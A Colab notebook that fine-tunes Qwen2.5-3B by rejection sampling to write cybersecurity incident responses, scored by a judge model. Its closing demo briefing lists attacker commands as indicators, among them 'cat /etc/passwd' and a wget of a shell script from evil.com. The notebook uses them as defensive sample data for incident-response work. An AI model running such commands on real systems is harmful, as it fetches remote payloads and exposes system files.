# CyberBench — Qwen2.5-3B Rejection-Sampling Fine-Tuning

**Architecture:**
- **Helper agents** (Log Analyst, Vuln Scanner, Threat Intel, Orchestrator) → Groq API
- **Target agent** → Qwen2.5-3B-Instruct (this model, running locally on Colab GPU)
- **Judge** → Groq API + fine-tuned SBERT
- **Training** → Rejection Sampling Fine-Tuning (RFT) with LoRA (PEFT)

**Flow per round:**
1. Pick N scenarios randomly
2. Groq agents produce a briefing
3. Qwen generates an incident response
4. Judge scores the response (0-100)
5. Keep top-K responses above threshold
6. Fine-tune Qwen on accepted responses (SFT loss on response tokens only)
7. Repeat — model improves each round

> **Runtime**: ~2-3 hours on Colab T4 for 5 rounds × 8 episodes

## 1. Install dependencies

In [ ]:
# Install all required packages
!pip install -q \
    groq \
    sentence-transformers \
    transformers>=4.45.0 \
    accelerate \
    peft \
    bitsandbytes \
    datasets \
    huggingface_hub \
    fastapi \
    uvicorn \
    python-dotenv \
    pydantic \
    httpx \
    numpy

print('✓ Dependencies installed')

## 2. Clone repo & configure

In [ ]:
import os

REPO_URL = 'https://github.com/YOUR_USERNAME/final_meta_hack.git'  # <-- set your repo
REPO_DIR = '/content/final_meta_hack'

if not os.path.exists(REPO_DIR):
    !git clone {REPO_URL} {REPO_DIR}
else:
    !cd {REPO_DIR} && git pull

%cd {REPO_DIR}
print(f'✓ Working directory: {os.getcwd()}')

In [ ]:
# Set your API keys
import os
from google.colab import userdata

# Store secrets in Colab: Runtime > Manage Keys
GROQ_API_KEY   = userdata.get('GROQ_API_KEY')   # required — for helper agents + judge
HF_TOKEN       = userdata.get('HF_TOKEN')        # optional — only if push_to_hub=True

os.environ['GROQ_API_KEY']   = GROQ_API_KEY
os.environ['GROQ_MODEL']     = 'llama-3.3-70b-versatile'
os.environ['HF_TOKEN']       = HF_TOKEN or ''

# Write .env for modules that use dotenv
with open('.env', 'w') as f:
    f.write(f'GROQ_API_KEY={GROQ_API_KEY}\n')
    f.write('GROQ_MODEL=llama-3.3-70b-versatile\n')

print('✓ API keys configured')

## 3. Download & fine-tune SBERT (for Judge scoring)

In [ ]:
# Download base SBERT model and fine-tune on cybersecurity pairs
!python sbert/download_model.py
!python sbert/train.py
print('✓ SBERT ready')

## 4. Verify pipeline with Groq target agent (baseline)

In [ ]:
# Quick sanity check: run one pipeline eval with the Groq-based target agent
import subprocess, json

result = subprocess.run(
    ['python', 'main.py', 'run', '--agent-name', 'GroqBaseline', '--mode', 'random', '--quiet'],
    capture_output=True, text=True
)
if result.returncode == 0:
    data = json.loads(result.stdout)
    print(f"Baseline score: {data['scores']['overall']:.1f} | Verdict: {data['verdict']}")
else:
    print('Error:', result.stderr[-500:])

## 5. Load Qwen2.5-3B-Instruct

In [ ]:
import torch
print(f'GPU: {torch.cuda.get_device_name(0) if torch.cuda.is_available() else "CPU"}')
print(f'VRAM: {torch.cuda.get_device_properties(0).total_memory / 1e9:.1f} GB' if torch.cuda.is_available() else '')

from qwen_training.rft_trainer import RFTConfig, build_lora_model

config = RFTConfig(
    model_name      = 'Qwen/Qwen2.5-3B-Instruct',
    load_in_4bit    = True,   # 4-bit quantization for T4 (16 GB)
    rounds          = 5,
    episodes_per_round = 8,
    top_k_ratio     = 0.5,    # keep top 50% of episodes per round
    min_score_threshold = 55.0,
    difficulty      = 'all',
    lora_rank       = 16,
    lora_alpha      = 32,
    num_train_epochs = 2,
    per_device_train_batch_size = 1,
    gradient_accumulation_steps = 4,
    output_dir      = 'qwen_training/checkpoints',
    push_to_hub     = bool(os.environ.get('HF_TOKEN')),
    hub_repo        = 'YOUR_HF_USERNAME/cyberbench-qwen25-3b',  # <-- set this
    hub_token       = os.environ.get('HF_TOKEN'),
)

model, tokenizer = build_lora_model(config)
print('✓ Qwen2.5-3B loaded with LoRA adapters')

## 6. Run RFT Training Loop

In [ ]:
import asyncio
from qwen_training.rft_trainer import run_rft

# Run full RFT training
result = await run_rft(config)

print('\n=== Training Complete ===')
print(f'Rounds completed: {len(result["history"])}')
for r in result['history']:
    print(f"  Round {r['round']}: avg={r['avg_score']:.1f} max={r['max_score']:.1f} accepted={r['accepted']}/{r['episodes']}")

## 7. Evaluate trained model

In [ ]:
import asyncio, json
from qwen_training.qwen_target_agent import QwenTargetAgent
from qwen_training.data_collector import collect_episode
from pipeline.case_selector import CaseSelector

# Use the final adapter
final_adapter = result.get('final_adapter')
agent = QwenTargetAgent(
    model_name=config.model_name,
    adapter_path=final_adapter,
    load_in_4bit=True,
)
# Reuse already-loaded model
agent._model = model
agent._tokenizer = tokenizer

# Run 3 evaluation episodes
selector = CaseSelector('data/scenarios.json', mode='random', difficulty='all')
eval_scores = []

for i in range(3):
    case = selector.pick()
    ep = await collect_episode(case, agent, verbose=True)
    eval_scores.append(ep['score'])
    print(f'  Eval {i+1}: case={ep["case_id"]} score={ep["score"]:.1f} verdict={ep["verdict"]}')

print(f'\nFinal Qwen avg score: {sum(eval_scores)/len(eval_scores):.1f}')

## 8. Save to Google Drive & Push to HuggingFace Hub

In [ ]:
# Mount Google Drive for persistent storage
from google.colab import drive
drive.mount('/content/drive')

import shutil, os

drive_dest = '/content/drive/MyDrive/cyberbench_qwen_checkpoints'
os.makedirs(drive_dest, exist_ok=True)
shutil.copytree('qwen_training/checkpoints', drive_dest, dirs_exist_ok=True)
print(f'✓ Checkpoints saved to Google Drive: {drive_dest}')

In [ ]:
# Push to HuggingFace Hub (only if HF_TOKEN is set)
if os.environ.get('HF_TOKEN') and final_adapter:
    from huggingface_hub import login
    login(token=os.environ['HF_TOKEN'])

    model.push_to_hub(config.hub_repo)
    tokenizer.push_to_hub(config.hub_repo)
    print(f'✓ Model pushed to: https://huggingface.co/{config.hub_repo}')
else:
    print('Skipping HF push (no token or no adapter)')

## 9. Inference demo

Test the trained model on a custom scenario:

In [ ]:
# Quick inference demo
demo_input = {
    'agent_name': 'Qwen-CyberBench-v1',
    'agent_description': 'Fine-tuned cybersecurity incident response model.',
    'goal': 'Determine if the suspicious login activity represents a compromised account.',
    'briefing': '''Confirmed IOCs:
- IP 185.220.101.45 (known Tor exit node)
- 47 failed SSH login attempts in 3 minutes
- Successful login from Tor IP at 03:14 UTC
- Subsequent commands: whoami, id, cat /etc/passwd, wget http://evil.com/shell.sh
Attack stage: Initial access achieved, privilege enumeration underway.
No CVEs identified — attack is credential-based.''',
}

result_demo = agent.run(demo_input)
print(result_demo['response'])